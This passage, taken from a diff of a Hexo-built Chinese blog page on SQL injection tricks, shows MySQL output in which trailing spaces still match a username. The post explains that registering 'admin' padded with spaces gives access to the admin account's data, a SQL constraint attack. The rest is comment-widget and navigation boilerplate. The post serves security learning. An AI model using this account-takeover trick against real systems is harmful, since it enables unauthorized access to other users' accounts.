|</span><br><span class="line">| <span class="number">12</span> | dhakkan  | dumbo      |</span><br><span class="line">| <span class="number">14</span> | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line"><span class="number">13</span> rows in set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where username=<span class="string">"Dumb    "</span>;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  <span class="number">1</span> | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where username=<span class="string">"Dumb"</span>;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  <span class="number">1</span> | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line"><span class="number">1</span> row in set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
+<p>达到越权的效果。<br>注册一个username=”admin    “,password=”123”<br>然后登陆，查询效果如上，返回用户信息。</p>
+
+        </section>
+    </article>
+    
+        <!-- disqus 评论框 start -->
+        <div class="comment">
+            <div id="disqus_thread" class="disqus-thread">
+              <i>Loading comments box needs to over the wall</i>
+            </div>
+        </div>
+        <!-- disqus 评论框 end -->
+    
+    
+        <!-- livere 评论框 start -->
+        <div class="comment">
+            <div id="lv-container" data-id="city" data-uid="your_livere_uid"></div>
+        </div>
+        <!-- livere 评论框 end -->
+        
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#group-by-…-with-rollup"><span class="toc-number">1.</span> <span class="toc-text">group by … with rollup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍group-by-…-with-rollup的用法"><span class="toc-number">1.1.</span> <span class="toc-text">介绍group by … with rollup的用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF"><span class="toc-number">1.2.</span> <span class="toc-text">CTF</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#一个MD5的sql注入的技巧"><span class="toc-number">2.</span> <span class="toc-text">一个MD5的sql注入的技巧</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql约束"><span class="toc-number">3.</span> <span class="toc-text">sql约束</span></a></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+<!-- disqus 公共JS代码 -->
+<script type="text/javascript">
+  /* * * CONFIGURATION VARIABLES * * */
+  var disqus_shortname = "your_disqus_shortname";
+  var disqus_identifier = "http://yoursite.com/2019/04/02/sql注入奇巧淫技/";
+  var disqus_url = "http://yoursite.com/2019/04/02/sql注入奇巧淫技/";
+
+  isAgent(getDisqus)
+
+  // determine user agent in China
+  function isAgent(cb) {
+    var url = '//graph.facebook.com/feed?callback=h';
+    var xhr = new XMLHttpRequest();
+    var called = false;
+    xhr.open('GET', url);
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+      called = true;
+      cb(true);
+      }
+    };
+    xhr.send();
+    // timeout 1s, this facebook API is very fast.
+    setTimeout(function() {
+      if (!called) {
+      xhr.abort();
+      cb(false)
+      }
+    }, 1000);
+  }
+
+  function getDisqus(isAgent) {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; 
+    dsq.async = true
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq)
+  }
+</script>
+<!-- disqus 公共JS代码 end -->
+
+
+<script type="text/javascript">
+  (function(d, s) {
+      var j, e = d.getElementsByTagName(s)[0];
+
+      if (typeof LivereTower === 'function') { return; }
+
+      j = d.createElement(s);
+      j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+      j.async = true;
+
+      e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+</body>
+</html>
